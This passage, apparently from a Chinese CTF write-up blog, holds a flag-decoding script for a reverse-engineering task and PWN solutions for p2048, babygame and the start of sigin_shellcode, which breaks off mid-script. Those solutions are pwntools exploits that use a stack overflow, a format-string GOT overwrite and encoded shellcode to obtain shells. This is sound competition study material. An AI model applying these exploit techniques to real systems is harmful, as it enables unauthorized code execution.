class="hljs-literal">null</span>),<br>CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, <span class="hljs-literal">null</span>)<br>&#125;));<br>&#125;<br><span class="hljs-keyword">if</span> (target6(&lt;&gt;p__6, Game.&lt;&gt;o__6.&lt;&gt;p__12.Target(Game.&lt;&gt;o__6.&lt;&gt;p__12, list[<span class="hljs-number">0</span>].get_Value(Type.Missing), list[<span class="hljs-number">1</span>].get_Value(Type.Missing))))<br>&#123;<br><span class="hljs-keyword">if</span> (Game.&lt;&gt;o__6.&lt;&gt;p__14 == <span class="hljs-literal">null</span>)<br>&#123;<br>Game.&lt;&gt;o__6.&lt;&gt;p__14 = CallSite&lt;Func&lt;CallSite, <span class="hljs-built_in">object</span>, <span class="hljs-built_in">string</span>&gt;&gt;.Create(Binder.Convert(CSharpBinderFlags.None, <span class="hljs-keyword">typeof</span>(<span class="hljs-built_in">string</span>), <span class="hljs-keyword">typeof</span>(Game)));<br>&#125;<br><span class="hljs-built_in">int</span>[] array = (<span class="hljs-keyword">from</span> c <span class="hljs-keyword">in</span> Game.&lt;&gt;o__6.&lt;&gt;p__14.Target(Game.&lt;&gt;o__6.&lt;&gt;p__14, list[<span class="hljs-number">1</span>].get_Value(Type.Missing))<br><span class="hljs-keyword">select</span> (<span class="hljs-built_in">int</span>)c).ToArray&lt;<span class="hljs-built_in">int</span>&gt;();<br><span class="hljs-built_in">int</span> num = (array[<span class="hljs-number">0</span>] - <span class="hljs-number">55296</span>) * <span class="hljs-number">1024</span> + array[<span class="hljs-number">1</span>] - <span class="hljs-number">56320</span> + <span class="hljs-number">65536</span> - <span class="hljs-number">128512</span>;<br><span class="hljs-keyword">this</span>.number[num] -= (list[<span class="hljs-number">1</span>].Row - <span class="hljs-number">1</span>) * (list[<span class="hljs-number">1</span>].Column - <span class="hljs-number">1</span>);<br><span class="hljs-keyword">this</span>.number[num] -= (list[<span class="hljs-number">0</span>].Row - <span class="hljs-number">1</span>) * (list[<span class="hljs-number">0</span>].Column - <span class="hljs-number">1</span>);<br>list[<span class="hljs-number">0</span>].set_Value(Type.Missing, list[<span class="hljs-number">1</span>].set_Value(Type.Missing, <span class="hljs-string">&quot;\ud83d\udca5&quot;</span>));<br>&#125;<br>&#125;<br><span class="hljs-keyword">this</span>.check();<br>&#125; <span class="hljs-comment">// 这里将会使用被消除的两个格子的内容中的utf-16le字符中的两个字符,进行运算之后得到索引值</span><br>  <span class="hljs-comment">// 然后使用number数组中对应索引值处的内容减去 两个格子的坐标(x*y)</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">根据分析写出解密代码</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br>flag=[<span class="hljs-number">25588</span>,<span class="hljs-number">31114</span>,<span class="hljs-number">28727</span>,<span class="hljs-number">26722</span>,<span class="hljs-number">24948</span>,<span class="hljs-number">25135</span>,<span class="hljs-number">25480</span>,<span class="hljs-number">29029</span>,<span class="hljs-number">23025</span>,<span class="hljs-number">25775</span>,<span class="hljs-number">15411</span>,<span class="hljs-number">25423</span>,<span class="hljs-number">25202</span>,<span class="hljs-number">30031</span>,<span class="hljs-number">27380</span>,<span class="hljs-number">30734</span>,<span class="hljs-number">25054</span>,<span class="hljs-number">25109</span>,<span class="hljs-number">20741</span>,<span class="hljs-number">28568</span>,<span class="hljs-number">28802</span>,<span class="hljs-number">24591</span>,<span class="hljs-number">26063</span>,<span class="hljs-number">30940</span>,<span class="hljs-number">30375</span>,<span class="hljs-number">19411</span>,<span class="hljs-number">29573</span>,<span class="hljs-number">20845</span>,<span class="hljs-number">27232</span>,<span class="hljs-number">26743</span>,<span class="hljs-number">25779</span>,<span class="hljs-number">24986</span>,<span class="hljs-number">31498</span>,<span class="hljs-number">30978</span>,<span class="hljs-number">22945</span>,<span class="hljs-number">26563</span>,<span class="hljs-number">35012</span>,<span class="hljs-number">29994</span>,<span class="hljs-number">27016</span>,<span class="hljs-number">29535</span>,<span class="hljs-number">21342</span>,<span class="hljs-number">26573</span>,<span class="hljs-number">27569</span>,<span class="hljs-number">25408</span>,<span class="hljs-number">31567</span>,<span class="hljs-number">25503</span>,<span class="hljs-number">21385</span>,<span class="hljs-number">27207</span>]<br>array=[[<span class="hljs-literal">None</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>)] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x30</span>)]<br>array[<span class="hljs-number">0</span>][ <span class="hljs-number">0</span>] = <span class="hljs-string">&quot;\ud83d\ude08&quot;</span><br>...<br>array[<span class="hljs-number">47</span>][ <span class="hljs-number">47</span>] = <span class="hljs-string">&quot;\ud83d\ude25&quot;</span><br><br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(array):<br>    <span class="hljs-keyword">for</span> j,v1 <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(v):<br>        arr0,arr1=[<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v1]<br>        num= (arr0 - <span class="hljs-number">55296</span>) * <span class="hljs-number">1024</span> + arr1 - <span class="hljs-number">56320</span> + <span class="hljs-number">65536</span> - <span class="hljs-number">128512</span><br>        <br>        <span class="hljs-built_in">print</span>(arr0,arr1,num)<br>        flag[num] -= (j ) * (i )<br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(flag))<br></code></pre></td></tr></table></figure><h2 id="PWN">PWN</h2><h3 id="p2048">p2048</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">game</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">char</span> *i; <span class="hljs-comment">// edi</span><br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">bool</span> v3; <span class="hljs-comment">// zf</span><br>  <span class="hljs-type">char</span> v4; <span class="hljs-comment">// al</span><br>  <span class="hljs-type">char</span> v5; <span class="hljs-comment">// [esp+7h] [ebp-41Dh]</span><br>  <span class="hljs-type">char</span> v6; <span class="hljs-comment">// [esp+8h] [ebp-41Ch]</span><br>  <span class="hljs-type">char</span> v7[<span class="hljs-number">1048</span>]; <span class="hljs-comment">// [esp+Ch] [ebp-418h] BYREF</span><br><br>  <span class="hljs-built_in">memset</span>(v7, <span class="hljs-number">0</span>, <span class="hljs-number">0x400</span>u);<br>  <span class="hljs-keyword">for</span> ( i = v7; ; *(i - <span class="hljs-number">1</span>) = v5 )<br>  &#123;<br>    result = getchar();<br>    v6 = result;<br>    v5 = result;<br>    <span class="hljs-keyword">if</span> ( (_BYTE)result == <span class="hljs-number">0xFF</span> )<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> ( (_BYTE)result != <span class="hljs-number">68</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">char</span>)result &lt;= <span class="hljs-number">68</span> )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( (_BYTE)result == <span class="hljs-number">66</span> )<br>          <span class="hljs-keyword">goto</span> LABEL_18;<br>        <span class="hljs-keyword">if</span> ( (<span class="hljs-type">char</span>)result &lt;= <span class="hljs-number">66</span> )<br>        &#123;<br>          v3 = (_BYTE)result == <span class="hljs-number">65</span>;<br>LABEL_14:<br>          <span class="hljs-keyword">if</span> ( !v3 )<br>            <span class="hljs-keyword">goto</span> LABEL_22;<br>          v4 = moveUp(a1, &amp;score);<br>          <span class="hljs-keyword">goto</span> LABEL_19;<br>        &#125;<br>LABEL_17:<br>        v4 = moveRight(a1, &amp;score);<br>        <span class="hljs-keyword">goto</span> LABEL_19;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( (_BYTE)result == <span class="hljs-number">100</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_17;<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">char</span>)result &gt; <span class="hljs-number">100</span> )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( (_BYTE)result != <span class="hljs-number">115</span> )<br>        &#123;<br>          v3 = (_BYTE)result == <span class="hljs-number">119</span>;<br>          <span class="hljs-keyword">goto</span> LABEL_14;<br>        &#125;<br>LABEL_18:<br>        v4 = moveDown(a1, &amp;score);<br>        <span class="hljs-keyword">goto</span> LABEL_19;<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( (_BYTE)result != <span class="hljs-number">97</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_22;<br>    &#125;<br>    v4 = moveLeft(a1, &amp;score);<br>LABEL_19:<br>    <span class="hljs-keyword">if</span> ( v4 )<br>    &#123;<br>      drawBoard(a1, score);<br>      addRandom(a1);<br>      drawBoard(a1, score);<br>      checkWin(a1, v7);<br>      <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> __int8)gameEnded(a1) )<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;         GAME OVER          &quot;</span>);<br>    &#125;<br>LABEL_22:<br>    <span class="hljs-keyword">if</span> ( v6 == <span class="hljs-number">113</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;        QUIT? (y/n)         &quot;</span>);<br>      result = getchar();<br>      v5 = result;<br>      <span class="hljs-keyword">if</span> ( (_BYTE)result == <span class="hljs-number">121</span> )<br>        <span class="hljs-keyword">return</span> result;<br>      drawBoard(a1, score);<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">114</span> )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;       RESTART? (y/n)       &quot;</span>);<br>      v5 = getchar();<br>      <span class="hljs-keyword">if</span> ( v5 == <span class="hljs-number">121</span> )<br>      &#123;<br>        initBoard(a1);<br>        score = <span class="hljs-number">0</span>;<br>      &#125;<br>      drawBoard(a1, score);<br>    &#125;<br>    ++i;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125; <span class="hljs-comment">// 存在一个死循环,可以一直读取输入的字符,并写入栈中</span><br>    <span class="hljs-comment">//所以这里可以使用栈溢出,来获取shell</span><br>    <span class="hljs-comment">//不过在测试时,发现2048的方阵也在栈中,</span><br>    <span class="hljs-comment">// 那么就可以直接用栈溢出将2048方阵中的数据都修改为10,这表示1024,这样在移动之后就可以得到2048</span><br>    <span class="hljs-comment">// 这样在执行checkWin之后就会触发win函数,就可以获取shell</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">通过修改2048方阵,getshell</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./p2048&#x27;</span>)<br>pause()<br><br>p.send(<span class="hljs-string">&#x27;\x0a&#x27;</span>*<span class="hljs-number">542</span>*<span class="hljs-number">2</span>)<br>p.send(<span class="hljs-string">&#x27;\x0a&#x27;</span>*<span class="hljs-number">16</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">因为程序开启了PIE保护,所以需要爆破</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    p=process(<span class="hljs-string">&#x27;./p2048&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">1048</span>+<span class="hljs-string">b&#x27;bbbb&#x27;</span>+p16(<span class="hljs-number">0xde60</span>))<br>        p.send(<span class="hljs-string">b&#x27;qy&#x27;</span>)<br>        p.sendline(<span class="hljs-string">&#x27;ls&#x27;</span>)<br>    <span class="hljs-keyword">except</span>:<br>        p.close()<br>    p.interactive()<br><br></code></pre></td></tr></table></figure><h3 id="babygame">babygame</h3><p>当获得了足够多的分数时就可以构造足够多次数的格式化字符串,以修改某个地址处的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> boom <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> CDLL<br><span class="hljs-keyword">import</span> sys<br>dll=CDLL(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>    base=<span class="hljs-string">b&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br>    dll.srand(dll.time(<span class="hljs-number">0</span>))<br>    res=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        res.append(base[dll.rand()%<span class="hljs-number">26</span>])<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(res)<br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">game</span>(<span class="hljs-params"><span class="hljs-built_in">round</span>=<span class="hljs-number">3</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;level : &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">round</span>):<br>        i=check()<br>        p.sendlineafter(<span class="hljs-string">&#x27;Give me : &#x27;</span>,<span class="hljs-built_in">bytes</span>(i))<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Wrong&#x27;</span> <span class="hljs-keyword">in</span> p.recv(<span class="hljs-number">5</span>):<br>            game(<span class="hljs-built_in">round</span>-j)<br>            <span class="hljs-keyword">return</span><br><br>    p.sendlineafter(<span class="hljs-string">&#x27;Give me : &#x27;</span>,<span class="hljs-string">&#x27;123&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ext_back</span>(<span class="hljs-params">num</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;need : &#x27;</span>,<span class="hljs-built_in">str</span>(num))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;purchase&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.readuntil(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    data=p.readuntil(<span class="hljs-string">&#x27;Backpack size&#x27;</span>,drop=<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">use</span>():<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">format</span>(<span class="hljs-params">data</span>):<br>    buy(data)<br>    res=show()<br>    <span class="hljs-built_in">print</span>(data)<br><span class="hljs-comment">#    print(res)</span><br>    <span class="hljs-keyword">return</span> res<br><br><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.binary=e<br>func=<span class="hljs-string">&#x27;puts&#x27;</span><br>func_got=e.got[func]<br>func1=<span class="hljs-string">&#x27;printf&#x27;</span><br>func1_got=e.got[func1]<br>exit=e.got[<span class="hljs-string">&#x27;exit&#x27;</span>]<br>lib_i=<span class="hljs-number">11</span><br>src_p=<span class="hljs-number">29</span><br>src=<span class="hljs-number">43</span><br><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)==<span class="hljs-number">1</span>:<br>    p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>    gdb.attach(p,<span class="hljs-string">&#x27;bp 0x401501&#x27;</span>)<br>    pause()<br><span class="hljs-keyword">else</span>:<br>    p=remote(sys.argv[<span class="hljs-number">1</span>],sys.argv[<span class="hljs-number">2</span>])<br>    <br>game(<span class="hljs-number">80</span>)<br>ext_back(<span class="hljs-number">512</span>)<br><br>pause()<br><br>buy(<span class="hljs-string">f&quot;%<span class="hljs-subst">&#123;lib_i&#125;</span>$p %<span class="hljs-subst">&#123;src_p&#125;</span>$p %<span class="hljs-subst">&#123;src&#125;</span>$p&quot;</span>)<br>d=show().split(<span class="hljs-string">b&#x27; &#x27;</span>)<br>libc_start_main=<span class="hljs-built_in">int</span>(d[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>)<br>src_a=<span class="hljs-built_in">int</span>(d[<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&quot;libc_start_main : &quot;</span>+<span class="hljs-built_in">hex</span>(libc_start_main))<br>success(<span class="hljs-string">&quot;sour_add : &quot;</span>+<span class="hljs-built_in">hex</span>(src_a))<br>src_2=src+<span class="hljs-number">1</span><br>src_3=src+<span class="hljs-number">2</span><br><br>src_a_=(src_a+<span class="hljs-number">8</span>)&amp;<span class="hljs-number">0xffff</span><br><span class="hljs-built_in">format</span>(<span class="hljs-string">f&quot;%<span class="hljs-subst">&#123;src_a_&#125;</span>c%<span class="hljs-subst">&#123;src_p&#125;</span>$hn&quot;</span>)<br><br>pause()<br>bss=bssfmt(<span class="hljs-built_in">format</span>)<br>bss.fmt_edit(p64(exit),src_p,src,src_a_)<br><br>bss.fmt_edit(p64(<span class="hljs-number">0x401501</span>),src,src_2,exit)<br><br>shellcode=asm(shellcraft.sh())<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;shellcode&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(shellcode)<br>f.close()<br><span class="hljs-keyword">import</span> os<br>payload=os.popen(<span class="hljs-string">&#x27;alpha x64 ascii mixedcase rax --input=&quot;./shellcode&quot;&#x27;</span>).read()<br><br>buy(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x20</span>+payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="sigin-shellcode">sigin_shellcode</h3><p>在<code>useful_tools</code>中已经将<code>a0寄存器</code>设置为指向<code>&quot;/bin/sh&quot;</code>的指针了,并且已经将<code>shellcode</code>中的后八位设置为执行<code>execve系统调用</code>的代码了,不过<code>a1</code>与<code>a2</code>寄存器没有清空,所以这是我们需要做的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>context.binary=e<br>Floor_num=<span class="hljs-number">0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Down</span>():<br>    <span class="hljs-keyword">global</span> Floor_num<br>    p.sendlineafter(<span class="hljs-string">&#x27;Go&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    cdll=CDLL(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>    cdll.srand(<span class="hljs-number">114514</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;want?&#x27;</span>,<span class="hljs-built_in">str</span>(cdll.rand()%<span class="hljs-number">114514</span>%(Floor_num+<span class="hljs-number">1</span>)))<br>    Floor_num+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">addatk</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;Go&gt; \n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br><span class="hljs-comment">#    p.interactive()</span><br>    p.sendlineafter(<span class="hljs-string">&#x27;buy? \n&gt; \n&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br>cmd=<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">b *0x401538</span><br><span class="hljs-string">b *0x400bb4</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)==<span class="hljs-number">3</span>:<br>    p=remote(sys.argv[<span class="hljs-number">1</span>],sys.argv[<span class="hljs-number">2</span>])<br><span class="hljs-keyword">else</span>:<br><br>    p=other_att(<span class="hljs-string">&quot;./pwn&quot;</span>,<span class="hljs-string">&#x27;mipsel&#x27;</span>)<br>    other_gdb(<span class="hljs-string">&quot;4444&quot;</span>,arch=<span class="hljs-string">&#x27;mips&#x27;</span>,cmd=cmd)<br>    context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>    pause()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span 